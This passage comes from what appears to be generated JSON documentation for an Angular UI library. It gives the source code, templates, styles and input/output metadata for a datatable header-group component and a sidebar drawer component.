      "sourceCode": "import { ChangeDetectionStrategy, Component, Input, OnChanges, SimpleChanges } from '@angular/core';\nimport { Column, ColumnGroup } from '../columns';\n\n@Component({\n  selector: 'sto-datatable-header-group',\n  templateUrl: './sto-datatable-header-group.component.html',\n  styleUrls: [ './sto-datatable-header-group.component.scss' ],\n  changeDetection: ChangeDetectionStrategy.OnPush\n})\nexport class StoDatatableHeaderGroupComponent implements OnChanges {\n  @Input()\n  groups: ColumnGroup[];\n  @Input()\n  height: number;\n  @Input()\n  width: string;\n  @Input()\n  transform: string;\n\n  @Input() columns: Column[];\n\n  testOffset(group: ColumnGroup) {\n    if ( !this.columns ) {\n      return '';\n    }\n    const { columnStart } = group;\n    const slice = this.columns.slice(0, columnStart);\n    let transform = 0;\n    slice.forEach(col => transform = transform + ( col.flexBasis || 80 ));\n    return `translateX(${transform + 8}px)`;\n  }\n\n  ngOnChanges(changes: SimpleChanges): void {\n    if ( changes.groups || changes.columns ) {\n      const groups: ColumnGroup[] = changes.groups ? changes.groups.currentValue : this.groups;\n      const columns = changes.columns ? changes.columns.currentValue : this.columns;\n      if ( groups && columns ) {\n        groups.forEach(group => {\n          group.transform = this.testOffset(group);\n        });\n      }\n    }\n  }\n}\n",
      "assetsDirs": [],
      "styleUrlsData": [
        {
          "data": ":host {\n  display: block;\n  overflow: hidden;\n}\n",
          "styleUrl": "./sto-datatable-header-group.component.scss"
        }
      ],
      "stylesData": "",
      "implements": [
        "OnChanges"
      ],
      "templateData": "<div [style.height.px]=\"height\"\n     [style.min-width]=\"width\"\n     [style.transform]=\"transform\"\n     class=\"sto-mdl-table__header-group\">\n  <div *ngFor=\"let group of groups\"\n       [style.transform]=\"group.transform\"\n       class=\"sto-mdl-table__header-group__cell\">\n    {{ group.name }}\n  </div>\n</div>\n"
    },
    {
      "name": "StoDrawerComponent",
      "id": "component-StoDrawerComponent-d93a63a87a0b96f4e38f77d8be4318e130708ad646fc9eb1ef925340658949364d7f8c2feab11b955ecdb0dd24615885e73281e3b32d7310439c14de9b0cabf2",
      "file": "libs/drawer/src/lib/sto-drawer/sto-drawer.component.ts",
      "changeDetection": "ChangeDetectionStrategy.OnPush",
      "encapsulation": [
        "ViewEncapsulation.None"
      ],
      "entryComponents": [],
      "inputs": [],
      "outputs": [],
      "providers": [],
      "selector": "sto-drawer",
      "styleUrls": [
        "./sto-drawer.component.scss",
        "../sto-navigation/_sto-navigation.scss"
      ],
      "styles": [],
      "templateUrl": [
        "./sto-drawer.component.html"
      ],
      "viewProviders": [],
      "inputsClass": [
        {
          "name": "animation",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 107,
          "type": "boolean",
          "decorators": []
        },
        {
          "name": "backdrop",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 109,
          "type": "boolean",
          "decorators": []
        },
        {
          "name": "closeOnClick",
          "deprecated": false,
          "deprecationMessage": "",
          "rawdescription": "\n\nIf the drawer should close when clicked outside the drawer.\n",
          "description": "<p>If the drawer should close when clicked outside the drawer.</p>\n",
          "line": 85,
          "type": "boolean",
          "decorators": []
        },
        {
          "name": "cssClass",
          "deprecated": false,
          "deprecationMessage": "",
          "rawdescription": "\n\nAdditional css class(es) as a string e.g 'sto-drawer--xmas'.\n",
          "description": "<p>Additional css class(es) as a string e.g &#39;sto-drawer--xmas&#39;.</p>\n",
          "line": 81,
          "type": "string",
          "decorators": []
        },
        {
          "name": "ignoreEscKey",
          "defaultValue": "false",
          "deprecated": false,
          "deprecationMessage": "",
          "rawdescription": "\n\nEsc key closed by default the drawer, this overrides that behaviour.\nDefault false.\n",
          "description": "<p>Esc key closed by default the drawer, this overrides that behaviour.\nDefault false.</p>\n",
          "line": 91,
          "type": "boolean",
          "decorators": []
        },
        {
          "name": "offset",
          "defaultValue": "'0'",
          "deprecated": false,
          "deprecationMessage": "",
          "rawdescription": "\n\nOffset (space) between the viewPanel right and the drawer in pixels\nBinds to the right style property.\nUsed for multiple drawers where the offset would be the widht of the allready opened drawer.\nDefault 0.\n",
          "description": "<p>Offset (space) between the viewPanel right and the drawer in pixels\nBinds to the right style property.\nUsed for multiple drawers where the offset would be the widht of the allready opened drawer.\nDefault 0.</p>\n",
          "line": 66,
          "type": "string",
          "decorators": []
        },
        {
          "name": "open",
          "deprecated": false,
          "deprecationMessage": "",
          "rawdescription": "\n\nIf the drawer is opened.\n",
          "description": "<p>If the drawer is opened.</p>\n",
          "line": 42,
          "type": "boolean",
          "decorators": []
        },
        {
          "name": "padding",
          "defaultValue": "'0px'",
          "deprecated": false,
          "deprecationMessage": "",
          "rawdescription": "\n\nOffset (space) between the viewPanel top and the drawer in pixels.\nBinds to the top style property.\nDefault 0.\n",
          "description": "<p>Offset (space) between the viewPanel top and the drawer in pixels.\nBinds to the top style property.\nDefault 0.</p>\n",
          "line": 72,
          "type": "string",
          "decorators": []
        },
        {
          "name": "position",
          "deprecated": false,
          "deprecationMessage": "",
          "rawdescription": "\n\nPosition of the drawer as a string\nLeft or right. Default right.\n",
          "description": "<p>Position of the drawer as a string\nLeft or right. Default right.</p>\n",
          "line": 77,
          "type": "\"left\" | \"right\"",
          "decorators": []
        },
        {
          "name": "width",
          "defaultValue": "'300px'",
          "deprecated": false,
          "deprecationMessage": "",
          "rawdescription": "\n\nThe width of the drawer in as a string (pixels: '600px', presentage: '33%', or viewPort:'30vw')\nDefault '25vw'\n",
          "description": "<p>The width of the drawer in as a string (pixels: &#39;600px&#39;, presentage: &#39;33%&#39;, or viewPort:&#39;30vw&#39;)\nDefault &#39;25vw&#39;</p>\n",
          "line": 100,
          "type": "string",
          "decorators": []
        }
      ],
      "outputsClass": [
        {
          "name": "cancel",
          "defaultValue": "new EventEmitter()",
          "deprecated": false,
          "deprecationMessage": "",
          "rawdescription": "\n\nEmits on cancel. When the cancel is called by pressing ESC key.\n {EventEmitter<any>}\n",
          "description": "<p>Emits on cancel. When the cancel is called by pressing ESC key.\n {EventEmitter<any>}</p>\n",
          "line": 129,
          "type": "EventEmitter"
        },
        {
          "name": "onClose",
          "defaultValue": "new EventEmitter()",
          "deprecated": false,
          "deprecationMessage": "",
          "rawdescription": "\n\nEmits on close.\n",
          "description": "<p>Emits on close.</p>\n",
          "line": 119,
          "type": "EventEmitter"
        },
        {
          "name": "onOpen",
          "defaultValue": "new EventEmitter()",
          "deprecated": false,
          "deprecationMessage": "",
          "rawdescription": "\n\nEmits on open.\n",
          "description": "<p>Emits on open.</p>\n",
          "line": 123,
          "type": "EventEmitter"
        },
        {
          "name": "onToggle",
          "defaultValue": "new EventEmitter<boolean>()",
          "deprecated": false,
          "deprecationMessage": "",
          "rawdescription": "\n\nEmits true if opened, false if closed.\n {EventEmitter<boolean>}\n",
          "description": "<p>Emits true if opened, false if closed.\n {EventEmitter<boolean>}</p>\n",
          "line": 115,
          "type": "EventEmitter"
        },
        {
          "name": "submit",
          "defaultValue": "new EventEmitter()",
          "deprecated": false,
          "deprecationMessage": "",
          "rawdescription": "\n\nEmits on submit. When the submit is called from code like CTRL+S.\n {EventEmitter<any>}\n",
          "description": "<p>Emits on submit. When the submit is called from code like CTRL+S.\n {EventEmitter<any>}</p>\n",
          "line": 134,
          "type": "EventEmitter"
        }
      ],
      "propertiesClass": [
        {
          "name": "_open",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "boolean",
          "optional": false,
          "description": "",
          "line": 93,
          "modifierKind": [
            121
          ]
        },
        {
          "name": "footer",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "ElementRef<HTMLElement>",
          "optional": false,
          "description": "",
          "line": 140,
          "decorators": [
            {
              "name": "ContentChild",
              "stringifiedArguments": "StoDrawerFooterComponent, {read: ElementRef}"
            }
          ]
        },
        {
          "name": "h",
          "defaultValue": "100",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "number",
          "optional": false,
          "description": "",
          "line": 104,
          "decorators": [
            {
              "name": "HostBinding",
              "stringifiedArguments": "'style.height.vh'"
            }
          ]
        },
        {
          "name": "headerChild",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "ElementRef<HTMLElement>",
          "optional": false,
          "description": "",
          "line": 142,
          "decorators": [
            {
              "name": "ContentChild",
              "stringifiedArguments": "StoDrawerHeaderComponent, {read: ElementRef}"
            }
          ]
        },
        {
          "name": "headerRef",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "ElementRef",
          "optional": false,
          "description": "",
          "line": 138,
          "decorators": [
            {
              "name": "ViewChild",
              "stringifiedArguments": "'header'"
            }
          ]
        },
        {
          "name": "height",
          "defaultValue": "'100%'",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "string",
          "optional": false,
          "description": "",
          "line": 136,
          "modifierKind": [
            123
          ]
        }
      ],
      "methodsClass": [
        {
          "name": "closeDrawer",
          "args": [
            {
              "name": "emit",
              "type": "",
              "deprecated": false,
              "deprecationMessage": "",
              "defaultValue": "true"
            }
          ],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 215,
          "deprecated": false,
          "deprecationMessage": "",
          "modifierKind": [
            123
          ],
          "jsdoctags": [
            {
              "name": "emit",
              "type": "",
              "deprecated": false,
              "deprecationMessage": "",
              "defaultValue": "true",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        {
          "name": "handleKeyboardEvent",
          "args": [
            {
              "name": "event",
              "type": "KeyboardEvent",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 149,
          "deprecated": false,
          "deprecationMessage": "",
          "decorators": [
            {
              "name": "HostListener",
              "stringifiedArguments": "'document:keydown', ['$event']"
            }
          ],
          "jsdoctags": [
            {
              "name": "event",
              "type": "KeyboardEvent",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        {
          "name": "isAnActiveOverlayPresent",
          "args": [],
          "optional": false,
          "returnType": "boolean",
          "typeParameters": [],
          "line": 186,
          "deprecated": false,
          "deprecationMessage": "",
          "rawdescription": "\n\nTest if an active overlay is active by checkout for cdk-overlay-containeres that are active.\nThis indicates a select-list, dialog or menu is opened.\ntrue if an active overlay is present in the DOM.\n",
          "description": "<p>Test if an active overlay is active by checkout for cdk-overlay-containeres that are active.\nThis indicates a select-list, dialog or menu is opened.\ntrue if an active overlay is present in the DOM.</p>\n",
          "modifierKind": [
            121
          ]
        },
        {
          "name": "ngAfterViewInit",
          "args": [],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 250,
          "deprecated": false,
          "deprecationMessage": ""
        },
        {
          "name": "ngOnInit",
          "args": [],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 244,
          "deprecated": false,
          "deprecationMessage": ""
        },
        {
          "name": "onWindowResize",
          "args": [],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 199,
          "deprecated": false,
          "deprecationMessage": "",
          "decorators": [
            {
              "name": "HostListener",
              "stringifiedArguments": "'window:resize', ['$event']"
            }
          ]
        },
        {
          "name": "openDrawer",
          "args": [
            {
              "name": "emit",
              "type": "",
              "deprecated": false,
              "deprecationMessage": "",
              "defaultValue": "true"
            }
          ],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 223,
          "deprecated": false,
          "deprecationMessage": "",
          "modifierKind": [
            123
          ],
          "jsdoctags": [
            {
              "name": "emit",
              "type": "",
              "deprecated": false,
              "deprecationMessage": "",
              "defaultValue": "true",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        {
          "name": "resizeContent",
          "args": [],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 230,
          "deprecated": false,
          "deprecationMessage": "",
          "modifierKind": [
            121
          ]
        },
        {
          "name": "testKeyCombos",
          "args": [
            {
              "name": "ev",
              "type": "KeyboardEvent",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 158,
          "deprecated": false,
          "deprecationMessage": "",
          "modifierKind": [
            121
          ],
          "jsdoctags": [
            {
              "name": "ev",
              "type": "KeyboardEvent",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        {
          "name": "testSingleKeys",
          "args": [
            {
              "name": "ev",
              "type": "KeyboardEvent",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 170,
          "deprecated": false,
          "deprecationMessage": "",
          "modifierKind": [
            121
          ],
          "jsdoctags": [
            {
              "name": "ev",
              "type": "KeyboardEvent",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        {
          "name": "toggle",
          "args": [
            {
              "name": "emit",
              "type": "",
              "deprecated": false,
              "deprecationMessage": "",
              "defaultValue": "true"
            }
          ],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 204,
          "deprecated": false,
          "deprecationMessage": "",
          "modifierKind": [
            123
          ],
          "jsdoctags": [
            {
              "name": "emit",
              "type": "",
              "deprecated": false,
              "deprecationMessage": "",
              "defaultValue": "true",
              "tagName": {
                "text": "param"
              }
            }
          ]
        }
      ],
      "deprecated": false,
      "deprecationMessage": "",
      "hostBindings": [
        {
          "name": "style.height.vh",
          "defaultValue": "100",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 104,
          "type": "number",
          "decorators": []
        }
      ],
      "hostListeners": [
        {
          "name": "document:keydown",
          "args": [
            {
              "name": "event",
              "type": "KeyboardEvent",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "argsDecorator": [
            "$event"
          ],
          "deprecated": false,
          "deprecationMessage": "",
          "line": 149
        },
        {
          "name": "window:resize",
          "args": [],
          "argsDecorator": [
            "$event"
          ],
          "deprecated": false,
          "deprecationMessage": "",
          "line": 199
        }
      ],
      "description": "<p>A sidebar navigation commonly referred as a drawer that animates from the left or right side of the viewport.</p>\n",
      "rawdescription": "\n\nA sidebar navigation commonly referred as a drawer that animates from the left or right side of the viewport.\n",
      "type": "component",
      "sourceCode": "import {\n  AfterViewInit,\n  ChangeDetectionStrategy,\n  ChangeDetectorRef,\n  Component,\n  ContentChild,\n  ElementRef,\n  EventEmitter,\n  HostBinding,\n  HostListener,\n  Input,\n  OnInit,\n  Output,\n  ViewChild,\n  ViewEncapsulation\n} from '@angular/core';\nimport { Key } from '@ngx-stoui/core';\nimport { StoDrawerFooterComponent } from './sto-drawer-footer.component';\nimport { drawerAnimations } from '../animation';\nimport { StoDrawerHeaderComponent } from './sto-drawer-header.component';\n\n/**\n * A sidebar navigation commonly referred as a drawer that animates from the left or right side of the viewport.\n */\n@Component({\n  selector: 'sto-drawer',\n  templateUrl: './sto-drawer.component.html',\n  styleUrls: [ './sto-drawer.component.scss', '../sto-navigation/_sto-navigation.scss' ],\n  encapsulation: ViewEncapsulation.None,\n  changeDetection: ChangeDetectionStrategy.OnPush,\n  animations: drawerAnimations\n})\n\nexport class StoDrawerComponent implements OnInit, AfterViewInit {\n\n  /**\n   * If the drawer is opened.\n   */\n  @Input()\n  @HostBinding('class.open')\n  get open(): boolean {\n    return this._open;\n  }\n\n  set open(open: boolean) {\n    this._open = open;\n    this.onOpen.emit(open);\n    this.cdr.detectChanges();\n  }\n\n  // @HostBinding('@drawerAnimations')\n  get slideInOut() {\n    if ( !this.animation ) {\n      return this.open ? 'openImmediate' : `closedImmediate-${this.position}`;\n    }\n    return this.open ? `open-${this.position}` : `closed-${this.position}`;\n  }\n\n  /**\n   * Offset (space) between the viewPanel right and the drawer in pixels\n   * Binds to the right style property.\n   * Used for multiple drawers where the offset would be the widht of the allready opened drawer.\n   * Default 0.\n   */\n  @Input() offset = '0';\n  /**\n   * Offset (space) between the viewPanel top and the drawer in pixels.\n   * Binds to the top style property.\n   * Default 0.\n   */\n  @Input() padding = '0px';\n  /**\n   * Position of the drawer as a string\n   * Left or right. Default right.\n   */\n  @Input() position: 'left' | 'right';\n  /**\n   * Additional css class(es) as a string e.g 'sto-drawer--xmas'.\n   */\n  @Input() cssClass: string;\n  /**\n   * If the drawer should close when clicked outside the drawer.\n   */\n  @Input() closeOnClick: boolean;\n\n  /**\n   * Esc key closed by default the drawer, this overrides that behaviour.\n   * Default false.\n   */\n  @Input() ignoreEscKey = false;\n\n  private _open: boolean;\n\n  /**\n   * The width of the drawer in as a string (pixels: '600px', presentage: '33%', or viewPort:'30vw')\n   * Default '25vw'\n   */\n  @Input() @HostBinding('style.width')\n  width = '300px';\n\n  // I don't see what harm this can do, the drawer should always be full height..\n  @HostBinding('style.height.vh')\n  h = 100;\n\n  @Input()\n  animation: boolean;\n  @Input()\n  backdrop: boolean;\n\n  /**\n   * Emits true if opened, false if closed.\n   *  {EventEmitter<boolean>}\n   */\n  @Output() onToggle = new EventEmitter<boolean>();\n  /**\n   * Emits on close.\n   */\n  @Output() onClose = new EventEmitter();\n  /**\n   * Emits on open.\n   */\n  @Output() onOpen = new EventEmitter();\n\n  /**\n   * Emits on cancel. When the cancel is called by pressing ESC key.\n   *  {EventEmitter<any>}\n   */\n  @Output() cancel = new EventEmitter();\n  /**\n   * Emits on submit. When the submit is called from code like CTRL+S.\n   *  {EventEmitter<any>}\n   */\n  @Output() submit = new EventEmitter();\n\n  public height = '100%';\n\n  @ViewChild('header') headerRef: ElementRef;\n  @ContentChild(StoDrawerFooterComponent, { read: ElementRef })\n  footer: ElementRef<HTMLElement>;\n  @ContentChild(StoDrawerHeaderComponent, { read: ElementRef })\n  headerChild: ElementRef<HTMLElement>;\n\n  constructor(private el: ElementRef, private cdr: ChangeDetectorRef) {\n  }\n\n\n  @HostListener('document:keydown', [ '$event' ])\n  handleKeyboardEvent(event: KeyboardEvent) {\n    if ( event.ctrlKey || event.altKey || event.shiftKey ) {\n      this.testKeyCombos(event);\n    } else {\n      this.testSingleKeys(event);\n    }\n  }\n\n\n  private testKeyCombos(ev: KeyboardEvent) {\n    // eslint-disable-next-line @typescript-eslint/no-explicit-any\n    const path: HTMLElement[] = ( ev as any ).path;\n    // Test to ensure we have focus inside the drawer\n    if ( !( path && path.includes(this.el.nativeElement) ) ) {\n      return;\n    }\n    if ( ev.ctrlKey && ev.keyCode === Key.Enter ) {\n      this.submit.emit();\n    }\n  }\n\n  private testSingleKeys(ev: KeyboardEvent) {\n    if ( ev.keyCode !== Key.Escape || this.ignoreEscKey ) {\n      return;\n    }\n    const isNotInsideAMenu = !this.isAnActiveOverlayPresent();\n    if ( isNotInsideAMenu ) {\n      this.closeDrawer();\n      this.cancel.emit();\n    }\n  }\n\n  /**\n   * Test if an active overlay is active by checkout for cdk-overlay-containeres that are active.\n   * This indicates a select-list, dialog or menu is opened.\n   * true if an active overlay is present in the DOM.\n   */\n  private isAnActiveOverlayPresent(): boolean {\n    const overlays: Array<Element> = Array.from(document.getElementsByClassName('cdk-overlay-container'))\n      .filter(overlay => !!overlay)\n      .filter(overlay => overlay.children.length > 0)\n      .map(overlay => Array.from(overlay.children))\n      .flat();\n    const overlaysActive = overlays\n      .map(el => el.innerHTML)\n      .filter(content => !!content || content !== '');\n    return overlaysActive.length !== 0;\n  }\n\n  @HostListener('window:resize', [ '$event' ])\n  onWindowResize() {\n    this.resizeContent();\n  }\n\n\n  public toggle(emit = true) {\n    if ( emit ) {\n      this.onToggle.emit(!this.open);\n    }\n    if ( !this.open ) {\n      this.openDrawer(emit);\n    } else {\n      this.closeDrawer(emit);\n    }\n  }\n\n  public closeDrawer(emit = true) {\n    this.open = false;\n    this.cdr.detectChanges();\n    if ( emit ) {\n      this.onClose.emit();\n    }\n  }\n\n  public openDrawer(emit = true) {\n    this.open = true;\n    if ( emit ) {\n      this.onOpen.emit();\n    }\n  }\n\n  private resizeContent() {\n    if ( this.open ) {\n      const hasFooter = this.footer;\n      const totalHeight: number = this.el?.nativeElement.offsetHeight;\n      let footerHeight = 0;\n\n      const headerHeight = this.headerRef?.nativeElement.offsetHeight;\n      if ( hasFooter ) {\n        footerHeight = this.footer?.nativeElement.offsetHeight;\n      }\n      this.height = `${totalHeight - footerHeight - headerHeight}px`;\n    }\n  }\n\n  ngOnInit() {\n    if ( !this.position ) {\n      this.position = 'left';\n    }\n  }\n\n  ngAfterViewInit() {\n    setTimeout(() => this.resizeContent());\n  }\n}\n",
      "assetsDirs": [],
      "styleUrlsData": [
        {
          "data": "@use '@angular/material' as mat;\n\n\n$header-height: 74px;\n$large-header-height: 24 * 4px;\n$footer-height: 16 * 4px;\n$header-size: 20px;\n\n\n.sto-drawer {\n  height: 100vh;\n  display: flex;\n  flex-direction: column;\n  background: var(--bg-card);\n\n  .sto-drawer__header__wrapper {\n    flex: 1 1 $header-height;\n    box-shadow: none;\n  }\n\n  .sto-drawer__content {\n    flex: 1 1 auto;\n    padding-bottom: 0;\n  }\n\n  .drawer-footer {\n    position: sticky;\n    bottom: 0;\n    display: flex;\n    justify-content: flex-end;\n    align-items: center;\n    padding: 16px 8px;\n  }\n\n  &__content {\n    padding-top: 0;\n  }\n\n  padding-top: 0;\n\n  &__footer {\n    flex: 1 1 $footer-height;\n  }\n\n  transition: right 400ms ease-in-out;\n  @include mat.elevation(3);\n  position: fixed;\n  top: 0;\n  width: 20%;\n  min-width: 260px;\n\n  &.right {\n    min-width: 450px;\n  }\n\n  z-index: 30;\n\n  &.right {\n    left: auto;\n    right: 0;\n  }\n\n  &.left {\n    left: 0;\n    right: auto;\n  }\n\n  &__content {\n    padding: 2 * 4px;\n    overflow-y: auto;\n    overflow-x: hidden;\n\n    &.navigation {\n      height: 100%;\n    }\n  }\n\n  &__footer {\n    @include mat.elevation(1);\n    bottom: 0;\n    left: 0;\n    padding: 2 * 4px;\n    width: 100%;\n\n    height: calc(#{$footer-height} - 4 * 4px);\n\n    button {\n      text-transform: uppercase;\n    }\n\n    &__more {\n      float: right;\n    }\n  }\n\n  &__header {\n    display: flex;\n    align-items: center;\n    width: 100%;\n    padding-top: 16px;\n\n    .sto-main-icon {\n      height: 40px;\n      width: 40px;\n      margin: 6px 0 0 16px;\n    }\n\n    &__title {\n      margin: 0;\n      padding-left: 16px;\n    }\n\n    &__suffix {\n      width: 100%;\n      text-align: right;\n      min-width: 56px;\n      //color: $white-87;\n    }\n\n    &__infix {\n      min-width: 56px;\n\n      //color: $white;\n    }\n\n    button.mat-icon-button {\n      margin: 0 8px;\n      border: 0;\n      outline: none;\n      cursor: pointer;\n\n    }\n\n    &__wrapper {\n      @include mat.elevation(4);\n      z-index: 1;\n      padding: 0;\n      display: flex;\n      box-sizing: border-box;\n      width: 100%;\n      height: $header-height;\n      flex-direction: row;\n      align-items: center;\n      white-space: nowrap;\n\n    }\n  }\n}\n\n.large-header {\n  .sto-drawer {\n    padding-top: $large-header-height;\n  }\n}\n\n.sto-navigation{\n  .mat-list {\n    .mat-subheader {\n      padding: 8px;\n    }\n  }\n}\n\n.sto-drawer__overlay {\n  position: fixed;\n  top: 0;\n  height: 100vh;\n  width: 100vw;\n  z-index: 40;\n  opacity: 0.08;\n}\n\n@import \"sto-drawer-tabs.component\";\n\n// Theme\n\n.sto-drawer__overlay {\n  background: var(--bg-overlay);\n}\n\n.sto-drawer {\n  background-color: var(--bg-card);\n\n  &__footer {\n    border-top: 1px solid var(--divider);\n    background-color: var(--bg-card);\n    color: var(--text);\n  }\n\n  &__content {\n    background-color: var(--bg-card);\n    color: var(--text);\n  }\n\n  &__header {\n    &__wrapper {\n      background-color: var(--bg-card);\n      color: var(--text);\n    }\n  }\n\n  // @deprecated TODO remove in angular 14\n  .sto-slide-panel {\n    color: var(--text);\n    background-color: var(--bg-card);\n\n    .mat-list.sto-navigation {\n      .mat-list-item {\n        color: var(--text);\n\n        .mat-icon {\n          color: var(--text);\n        }\n\n        .sto-navigation__item__text {\n          color: var(--text);\n\n          a {\n            color: var(--primary-resting);\n          }\n        }\n      }\n    }\n  }\n}\n",
          "styleUrl": "./sto-drawer.component.scss"
        },
        {
          "data": ".sto-drawer {\n  .sto-slide-panel {\n    margin: -8px;\n\n    .mat-list {\n      &.sto-navigation {\n\n        .mat-divider {\n          margin-top: 15px;\n          margin-bottom: 16px;\n        }\n\n        padding: 8px 0 0 0;\n\n        .mat-list-item {\n          padding: 0;\n          cursor: pointer;\n          font-weight: 500;\n\n          .mat-button {\n            @extend %list-item-properties;\n          }\n\n          .sto-navigation__item__text a {\n            text-decoration: none;\n            font-weight: 500;\n          }\n\n          .sto-navigation__suffix {\n            padding: 12px 0;\n            margin-right: 16px;\n            float: right;\n            line-height: 0;\n\n            .mat-icon {\n              padding: 0;\n              width: 24px;\n            }\n          }\n\n          .mat-list-item-content {\n            padding: 0;\n          }\n\n          .mat-icon {\n            padding: 0px 32px 0px 16px;\n            line-height: 24px;\n\n            svg {\n              opacity: 0.54;\n            }\n          }\n        }\n      }\n    }\n\n    .sto-navigation__backdrop {\n      position: fixed;\n      top: 0;\n      right: 0;\n      bottom: 0;\n      left: 0;\n      transition: opacity 0.4s ease-in-out;;\n      transform: translate(0);\n      opacity: 0.25;\n      cursor: pointer;\n      background: black;\n      z-index: 59;\n    }\n\n    .sto-navigation__backdrop--hidden {\n      transform: translate(9999px);\n      opacity: 0;\n    }\n\n    // dropdown\n    .mat-list.sto-navigation {\n\n      .mat-expansion-panel.sto-navigation__dropdown {\n        box-shadow: none;\n        background-color: transparent;\n      }\n\n      .mat-expansion-panel-header.sto-navigation__dropdown__header {\n        padding: 0;\n      }\n\n      .mat-expansion-panel-header-title.sto-navigation__dropdown__title {\n        @extend %list-item-properties;\n      }\n\n      .mat-expansion-indicator {\n        margin-right: 24px;\n        float: right;\n        line-height: 0;\n\n        &:after {\n          padding: 4px;\n        }\n      }\n\n      .mat-expansion-panel-body {\n        padding: 0;\n\n        .sto-navigation__item__text {\n          padding-left: 16px;\n          font-weight: normal;\n        }\n      }\n\n      .sto-navigation__prefix {\n        display: inline-block;\n        padding: 12px 35px 0 16px;\n        line-height: 0;\n      }\n    }\n\n    .mat-list.sto-list__navigation {\n      padding-top: 0;\n      margin: 0 2px;\n\n      .mat-subheader {\n        padding: 0 4px;\n      }\n\n      .mat-list-item {\n        border-top-left-radius: 4px;\n        border-top-right-radius: 4px;\n      }\n    }\n\n    .mat-icon-button.sto-list__navigation__button {\n\n      &:hover {\n      }\n    }\n\n  }\n}\n\n%list-item-properties {\n  width: 100%;\n  text-transform: none;\n  text-align: left;\n  padding: 0;\n  margin: 0;\n  line-height: 48px;\n  cursor: pointer;\n}\n",
          "styleUrl": "../sto-navigation/_sto-navigation.scss"
        }
      ],
      "stylesData": "",
      "constructorObj": {
        "name": "constructor",
        "description": "",
        "deprecated": false,
        "deprecationMessage": "",
        "args": [
          {
            "name": "el",
            "type": "ElementRef",
            "deprecated": false,
            "deprecationMessage": ""
          },
          {
            "name": "cdr",
            "type": "ChangeDetectorRef",
            "deprecated": false,
            "deprecationMessage": ""
          }
        ],
        "line": 142,
        "jsdoctags": [
          {
            "name": "el",
            "type": "ElementRef",
            "deprecated": false,
            "deprecationMessage": "",
            "tagName": {
              "text": "param"
            }
          },
          {
            "name": "cdr",
            "type": "ChangeDetectorRef",
            "deprecated": false,
            "deprecationMessage": "",
            "tagName": {
              "text": "param"
            }
          }
        ]
      },
      "implements": [
        "OnInit",
        "AfterViewInit"
      ],
      "accessors": {
        "open": {
          "name": "open",
          "setSignature": {
            "name": "open",
            "type": "void",
            "deprecated": false,
            "deprecationMessage": "",
            "args": [
              {
                "name": "open",
                "type": "boolean",
                "deprecated": false,
                "deprecationMessage": ""
              }
            ],
            "returnType": "void",
            "line": 46,
            "jsdoctags": [
              {
                "name": "open",
                "type": "boolean",
                "deprecated": false,
                "deprecationMessage": "",
                "tagName": {
                  "text": "param"
                }
              }
            ]
          },
          "getSignature": {
            "name": "open",
            "type": "boolean",
            "returnType": "boolean",
            "line": 42,
            "rawdescription": "\n\nIf the drawer is opened.\n",
            "description": "<p>If the drawer is opened.</p>\n"
          }
        },
        "slideInOut": {
          "name": "slideInOut",
          "getSignature": {
            "name": "slideInOut",
            "type": "",
            "returnType": "",
            "line": 53
          }
        }
      },
      "readme": "<h3 id=\"sto-drawer\">Sto Drawer</h3>\n<p>A sidebar navigation commonly referred as a drawer that animates from the left or right side of the viewport.</p>\n<p>####Selector / Content projection</p>\n<h5 id=\"sto-filter-header\">sto-filter-header</h5>\n<p>Content (HTML) that is inside the header of the drawer.  </p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-drawer-header&gt;\n        &lt;h3&gt;Price&lt;/h3&gt;\n        &lt;div class=&quot;sto-drawer__header__suffix&quot;&gt;\n            &lt;button type=&quot;button&quot;\n                    mat-icon-button\n                    (click)=&quot;cancel()&quot;&gt;\n                &lt;mat-icon&gt;close&lt;/mat-icon&gt;\n            &lt;/button&gt;\n        &lt;/div&gt;\n    &lt;/sto-drawer-header&gt;</code></pre></div><h5 id=\"sto-drawer__footer\">sto-drawer__footer</h5>\n<p>Content (HTML) that is inside the header footer.  </p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-drawer-footer&gt;\n        &lt;mat-progress-bar class=&quot;sto-progress-bar&quot; mode=&quot;indeterminate&quot; *ngIf=&quot;!hasData || (isLoading$ | async)&quot;&gt;&lt;/mat-progress-bar&gt;\n        &lt;button mat-raised-button (click)=&quot;save()&quot; color=&quot;primary&quot;&gt;Save&lt;/button&gt;\n        &lt;button mat-button (click)=&quot;cancel(true)&quot; color=&quot;primary&quot;&gt;Cancel&lt;/button&gt;\n&lt;/sto-drawer-footer&gt;</code></pre></div><p>####Input </p>\n<h5 id=\"offset\">offset</h5>\n<p>Offset (space) between the viewPanel right and the drawer in pixels. Binds to the right style property.\nUsed for multiple drawers where the offset would be the 